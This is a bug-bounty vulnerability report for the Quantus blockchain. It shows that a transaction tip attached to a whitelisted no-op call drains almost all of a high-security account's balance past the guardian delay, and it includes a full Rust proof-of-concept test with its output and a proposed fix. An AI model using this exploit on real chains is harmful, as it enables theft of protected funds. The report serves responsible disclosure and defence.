# 88609 bc critical high security whitelist is incomplete the transaction tip bypasses the guardian delay entirely

**Submitted on Aug 14th 2026 at 06:16:53 UTC by @Naresh\_Kandula for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #88609
* **Report Type:** Blockchain/DLT
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-chain>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Summary

Quantus ships a "high-security account" feature whose entire purpose is to make funds **unstealable even when the signing key is compromised**: every value-moving call from such an account must go through `schedule_transfer`, which holds the funds for a configured delay during which a guardian can `cancel` or `recover_funds`.

The policy that enforces this inspects **only the `RuntimeCall`**. A transaction's **tip** is not part of the call — it is a field of a *different* transaction extension (`ChargeTransactionPayment`) that runs **after** the high-security gate in the `TxExtension` tuple. The tip is unbounded, is paid immediately, is never refunded, and is credited in full to the block author.

An attacker holding the key therefore attaches an arbitrary tip to a **whitelisted call that is guaranteed to do nothing** and removes the account's entire balance in a single block — with no delay, no `PendingTransfer`, and nothing for the guardian to cancel.

**Measured on the frozen code: 99.9994 % of a protected account's balance leaves in one block.**

## Root cause

**1 — the policy predicate takes only the call** (`chain/runtime/src/configs/mod.rs:683-694`):

```rust
fn is_whitelisted(call: &RuntimeCall) -> bool {
    matches!(
        call,
        RuntimeCall::ReversibleTransfers(pallet_reversible_transfers::Call::schedule_transfer { .. }) |
        RuntimeCall::ReversibleTransfers(pallet_reversible_transfers::Call::cancel { .. }) |
        RuntimeCall::ReversibleTransfers(pallet_reversible_transfers::Call::recover_funds { .. }) |
        RuntimeCall::Vesting(pallet_vesting::Call::claim { .. })
    )
}
```

**2 — the gate discards every other input** (`chain/runtime/src/transaction_extensions.rs:60-81`). `validate` receives `_info` and `_len` and ignores both; the tip is not even reachable from here, because it lives inside another extension's own struct:

```rust
if !crate::configs::HighSecurityConfig::is_call_allowed(&who, call) {
    return Err(TransactionValidityError::Invalid(InvalidTransaction::Custom(1)));
}
```

**3 — the tip is charged after the gate** (`chain/runtime/src/lib.rs`, `TxExtension` tuple):

| idx | extension                                                         |
| --- | ----------------------------------------------------------------- |
| 6   | `CheckWeight`                                                     |
| 7   | `ReversibleTransactionExtension` ← high-security gate (call only) |
| 8   | `WormholeProofRecorderExtension`                                  |
| 9   | `ChargeTransactionPayment::from(tip)` ← withdraws fee + tip       |

`ChargeTransactionPayment::prepare` withdraws `inclusion_fee + tip` from the signer. The tip is **never** refunded on failure — `post_dispatch` only corrects the weight component. There is no tip cap anywhere in the runtime (`grep -rn "tip" runtime/src/` returns no fee-related logic).

**4 — the value is credited to the block author.** The fee sink is `pallet_mining_rewards::TransactionFeesCollector` (`chain/runtime/src/configs/mod.rs:479`), and `on_finalize` re-mints **100 %** of `CollectedFees` to the miner (`chain/pallets/mining-rewards/src/lib.rs:193`):

```rust
// Send fees to miner if any
Self::mint_reward(miner.as_ref(), tx_fees);
```

So this is not burn-griefing: an attacker who mines the block receives the swept balance. QPoW mining is permissionless.

## The invariant this breaks — stated by the project itself

`chain/pallets/reversible-transfers/README.md:65-72`:

> *"An attacker who compromises account keys cannot disable protections to steal funds immediately … attackers cannot bypass the delay period and guardian oversight."*

`chain/primitives/high-security/src/lib.rs:82-86` states the whitelist *"includes only operations that are reversible or delayed."* The tip is neither reversible nor delayed, and the whitelist never sees it.

## Proof of Concept

Self-contained runtime integration test. It runs through the **real** pipeline — a genuine ML-DSA-65 signature over the real `SignedPayload`, submitted with `Executive::apply_extrinsic` and the complete `TxExtension` tuple. No extension is driven by hand. The account is funded inside the harness.

### Steps to reproduce

{% stepper %}
{% step %}

## Clone the in-scope chain repo at the frozen competition commit

```bash
git clone --branch audit-comp-ready \
  https://github.com/immunefi-team/audit-comp-quantus-chain.git
cd audit-comp-quantus-chain
git checkout 3b243b870a5442a6e5f443056f67bbba87d472f5
```

{% endstep %}

{% step %}

## Save the proof-of-concept source

Save the source in the next section verbatim as **`runtime/tests/hs_tip_bypass.rs`**.

It is a new integration-test file; **no in-scope file is modified**.
{% endstep %}

{% step %}

## Run the test

```bash
cargo test -p quantus-runtime --test hs_tip_bypass -- --nocapture
```

The test passes, printing the measured drain. Toolchain: the repo's pinned `rust-toolchain` (1.93.0).
{% endstep %}
{% endstepper %}

### Proof-of-concept source (complete, self-contained)

```rust
//! PoC — High-security (reversible-transfers) protection is bypassed by the transaction TIP.
//!
//! The high-security call whitelist (`HighSecurityConfig::is_whitelisted`,
//! runtime/src/configs/mod.rs) inspects only the `RuntimeCall`. The transaction `tip` is
//! carried by `ChargeTransactionPayment`, which sits AFTER the high-security gate in
//! `TxExtension`, so it is never subject to the policy. A whitelisted, guaranteed-to-fail
//! call therefore carries an unbounded tip that leaves the protected account in the same
//! block — with no delay, no `PendingTransfer`, and nothing for the guardian to cancel.
//!
//! Everything below runs through the REAL pipeline: a genuine ML-DSA-65 signature over the
//! real `SignedPayload`, submitted via `Executive::apply_extrinsic`.

use codec::Encode;
use qp_dilithium_crypto::Dilithium65Pair;
use quantus_runtime::{
        transaction_extensions::{ReversibleTransactionExtension, WormholeProofRecorderExtension},
        Balances, BalancesCall, Executive, MiningRewards, ReversibleTransfers, Runtime, RuntimeCall,
        Signature, SignedPayload, System, TxExtension, UncheckedExtrinsic, EXISTENTIAL_DEPOSIT, UNIT,
        VERSION,
};
use sp_core::Pair;
use sp_runtime::{
        generic::Era,
        traits::{IdentifyAccount, StaticLookup},
        AccountId32, BuildStorage, MultiAddress,
};

fn test_ext(funded: &AccountId32) -> sp_io::TestExternalities {
        let mut t = frame_system::GenesisConfig::<Runtime>::default().build_storage().unwrap();
        pallet_treasury::GenesisConfig::<Runtime> {
                treasury_account: Some(AccountId32::from([9u8; 32])),
                treasury_portion: Some(sp_runtime::Permill::from_percent(50)),
        }
        .assimilate_storage(&mut t)
        .unwrap();

        let mut ext = sp_io::TestExternalities::new(t);
        let who = funded.clone();
        ext.execute_with(move || {
                use frame_support::traits::Currency;
                Balances::make_free_balance_be(&who, 1000 * UNIT);
                System::set_block_number(1);
        });
        ext
}

/// Build a real signed extrinsic with an attacker-chosen `tip`.
fn signed(
        pair: &Dilithium65Pair,
        sender: AccountId32,
        call: RuntimeCall,
        nonce: u32,
        tip: u128,
) -> UncheckedExtrinsic {
        let genesis_hash = System::block_hash(0);

        let tx_ext: TxExtension = (
                frame_system::CheckNonZeroSender::<Runtime>::new(),
                frame_system::CheckSpecVersion::<Runtime>::new(),
                frame_system::CheckTxVersion::<Runtime>::new(),
                frame_system::CheckGenesis::<Runtime>::new(),
                frame_system::CheckEra::<Runtime>::from(Era::immortal()),
                frame_system::CheckNonce::<Runtime>::from(nonce),
                frame_system::CheckWeight::<Runtime>::new(),
                // <-- the high-security gate
                ReversibleTransactionExtension::<Runtime>::new(),
                WormholeProofRecorderExtension::<Runtime>::new(),
                // <-- the tip is carried here, AFTER the gate
                pallet_transaction_payment::ChargeTransactionPayment::<Runtime>::from(tip),
                frame_metadata_hash_extension::CheckMetadataHash::<Runtime>::new(false),
                frame_system::WeightReclaim::<Runtime>::new(),
        );

        let raw_payload = SignedPayload::from_raw(
                call.clone(),
                tx_ext.clone(),
                (
                        (),
                        VERSION.spec_version,
                        VERSION.transaction_version,
                        genesis_hash,
                        genesis_hash,
                        (),
                        (),
                        (),
                        (),
                        (),
                        None,
                        (),
                ),
        );
        let signature = raw_payload.using_encoded(|e| pair.sign(e));

        UncheckedExtrinsic::new_signed(
                call,
                MultiAddress::Id(sender),
                Signature::Dilithium65(signature),
                tx_ext,
        )
}

#[test]
fn high_security_account_is_drained_by_the_transaction_tip() {
        let pair = Dilithium65Pair::from_seed_slice(&[42u8; 32]).expect("valid seed");
        let victim = pair.public().into_account();
        let guardian = AccountId32::from([7u8; 32]);
        let mut ext = test_ext(&victim);

        ext.execute_with(|| {
                // ---------------------------------------------------------------- 1. opt in
                // The user enrols in high security exactly as a real user would: a signed
                // extrinsic through the full pipeline. delay = 100 blocks of guardian window.
                let enrol = RuntimeCall::ReversibleTransfers(
                        pallet_reversible_transfers::Call::set_high_security {
                                guardian: guardian.clone(),
                                delay: qp_scheduler::BlockNumberOrTimestamp::BlockNumber(100),
                        },
                );
                Executive::apply_extrinsic(signed(&pair, victim.clone(), enrol, 0, 0))
                        .expect("enrolment must be a valid transaction")
                        .expect("enrolment must succeed");
                assert!(
                        ReversibleTransfers::is_high_security_account(&victim),
                        "victim must now be a high-security account"
                );

                let protected = Balances::free_balance(&victim);
                println!("protected balance          = {protected}");

                // ------------------------------------------------- 2. the control DOES work
                // A plain transfer is not whitelisted, so the high-security gate rejects the
                // transaction outright. This is the protection the README promises.
                let steal = RuntimeCall::Balances(BalancesCall::transfer_keep_alive {
                        dest: <Runtime as frame_system::Config>::Lookup::unlookup(AccountId32::from([8u8; 32])),
                        value: 500 * UNIT,
                });
                assert!(
                        Executive::apply_extrinsic(signed(&pair, victim.clone(), steal, 1, 0)).is_err(),
                        "a direct transfer from a high-security account MUST be blocked"
                );
                assert_eq!(
                        Balances::free_balance(&victim),
                        protected,
                        "blocked transfer must not move anything"
                );

                // ------------------------------------------------------- 3. walk past it
                // `cancel` IS whitelisted. There is no pending transfer with this id, so the
                // dispatch is a guaranteed no-op failure — it exists purely to carry the tip.
                let carrier = RuntimeCall::ReversibleTransfers(pallet_reversible_transfers::Call::cancel {
                        tx_id: sp_core::H256::default(),
                });

                // Size the tip so the account is left with ~1 UNIT (0.1% of the balance).
                // The probe carries a max-width tip so its encoded length is an upper bound
                // on the real one, making the fee estimate conservative.
                let probe = signed(&pair, victim.clone(), carrier.clone(), 1, protected);
                let len = probe.encode().len() as u32;
                let info = {
                        use frame_support::dispatch::GetDispatchInfo;
                        probe.get_dispatch_info()
                };
                let inclusion_fee =
                        pallet_transaction_payment::Pallet::<Runtime>::compute_fee(len, &info, 0u128);
                let residual = EXISTENTIAL_DEPOSIT;
                let tip = protected - residual - inclusion_fee;
                println!("inclusion fee              = {inclusion_fee}");
                println!("attacker tip               = {tip}");

                let attack = signed(&pair, victim.clone(), carrier, 1, tip);
                let outcome = Executive::apply_extrinsic(attack)
                        .expect("the high-security gate ACCEPTS this transaction");
                assert!(outcome.is_err(), "the carrier call itself fails — it does nothing");

                // ---------------------------------------------------------- 4. the damage
                let after = Balances::free_balance(&victim);
                println!("balance after one block    = {after}");
                println!("removed                    = {}", protected - after);
                println!(
                        "removed pct                = {:.4}%",
                        (protected - after) as f64 * 100.0 / protected as f64
                );
                // The attacker keeps the account alive on purpose: the victim is left with dust,
                // not reaped, so nothing about the high-security enrolment is disturbed.
                assert!(
                        (protected - after) * 10_000 / protected >= 9_999,
                        "more than 99.99% of the protected balance leaves in ONE block \
                         (residual {after}, started {protected})"
                );
                assert!(after >= EXISTENTIAL_DEPOSIT, "account kept alive above the existential deposit");

                // The guardian has nothing to act on: no delayed transfer was ever created,
                // so `cancel` has no target and the delay window is irrelevant.
                assert!(
                        pallet_reversible_transfers::PendingTransfersBySender::<Runtime>::get(&victim)
                                .is_empty(),
                        "no pending transfer exists — the guardian window never opens"
                );

                // ------------------------------------------- 5. it is credited to the miner
                // `pallet_mining_rewards::on_finalize` re-mints 100% of CollectedFees to the
                // block author (pallets/mining-rewards/src/lib.rs:193), so an attacker who
                // mines this block captures the swept balance.
                let collected = MiningRewards::collected_fees();
                println!("queued to block author     = {collected}");
                assert!(
                        collected >= tip,
                        "the tip is queued for the block author, not burned (got {collected}, tip {tip})"
                );
        });
}
```

### Output

```
protected balance          = 999993777213000
inclusion fee              = 11758787000
attacker tip               = 999981018426000
balance after one block    = 5875000000
removed                    = 999987902213000
removed pct                = 99.9994%
queued to block author     = 999994125000000
test high_security_account_is_drained_by_the_transaction_tip ... ok
test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out
```

The test asserts, in order:

1. The victim enrols in high security via a real `set_high_security` extrinsic (guardian set, 100-block delay).
2. **The control genuinely works** — a plain `Balances::transfer_keep_alive` from the account is *rejected* by the gate and moves nothing.
3. The same account's `ReversibleTransfers::cancel { tx_id: H256::default() }` **is accepted** with a maximal tip. The call itself fails (`PendingTxNotFound`) — it exists only to carry the tip.
4. `> 99.99 %` of the balance is gone in that one block; the account is deliberately left above the existential deposit so nothing about the enrolment is disturbed.
5. `PendingTransfersBySender::get(victim).is_empty()` — **no delayed transfer was ever created, so the guardian window never opens and `cancel`/`recover_funds` have no target.**
6. The swept value sits in `MiningRewards::collected_fees()`, queued for the block author.

## Mitigations, and why none of them save it

| Candidate mitigation                           | Why it fails                                                                                                                                                                        |
| ---------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Preservation::Preserve` on the fee withdrawal | Only reserves the existential deposit. Measured residual: 5.875 × ED out of 1000 UNIT.                                                                                              |
| `Fortitude::Polite`                            | Only protects funds already held/frozen. A high-security account's *free* balance is not held — holds are created by `schedule_transfer`, which is exactly the path being bypassed. |
| Guardian `cancel`                              | Requires a `PendingTransfer`. None is ever created (asserted in the PoC).                                                                                                           |
| Guardian `recover_funds`                       | Sweeps the *remaining* free balance. After the attack that is dust.                                                                                                                 |
| The delay                                      | Never starts. The drain completes inside the block the transaction is included in.                                                                                                  |
| A tip cap                                      | Does not exist anywhere in the runtime.                                                                                                                                             |
| Fee estimation / wallet UI                     | The attacker constructs and signs the extrinsic directly; the victim's wallet is not involved.                                                                                      |

## Novelty

* Not in any of the four in-repo audit reports. `ChargeTransactionPayment`, "transaction tip", and `tip` in the fee sense appear **zero** times across all four extracted texts (Equilibrium PoW/Poseidon 2025-10, Neodyme 2025-12, Eiger 2026-03, Equilibrium Substrate 2026-05).
* Not in any commit body: `git log --all` over 635 commits has no `tip` hit in the fee sense (the only matches are "chain tip" in mempool code).
* Not one of the three published Immunefi Known Issues.
* The four kill-listed `EQ-QNT-REVERSIBLE-*` findings are enrolment permanence (F-01), asset weights (F-02), orphaned holds (F-03) and documentation (O-01/02) — none touches fees.
* The public post-audit hardening of this exact policy (#610 origin-rewriting wrappers, #639, #654's `ensure_nested_call_allowed` for `batch`/`batch_all`/`force_batch`/`if_else`) all extends the *call*-based check. This report is the input the predicate is still missing.

## Scope

The defect is in `runtime/src/configs/mod.rs`, `runtime/src/transaction_extensions.rs` and `primitives/high-security/src/lib.rs` — all Quantus-original code with no upstream baseline. `pallets/transaction-payment` is byte-identical to upstream `pallet-transaction-payment` 45.0.0 and is cited **only as the sink**; it behaves exactly as upstream specifies. The bug is that Quantus's own policy layer does not account for it.

Per the program's scope rules, this is an actor **exceeding** its attributed privileges: the attributed privilege of a high-security signer is precisely the four whitelisted, delayed-or-reversible operations. An unbounded, immediate, irreversible transfer of the full balance to a third party is not among them — it is the exact outcome the feature is advertised to prevent.

## Recommended fix

Make the high-security policy a function of the whole transaction, not just the call. Either:

1. Give `ReversibleTransactionExtension` access to the tip and reject any non-zero tip from a high-security account (simplest, no new state); or
2. Cap the tip for high-security accounts at a small constant, and route any excess through `schedule_transfer` so it inherits the delay and the guardian's authority.

Option 1 is a two-line change and closes the class. Also worth auditing for the same shape: any future extension placed after the gate that can move value out of the signer's account.
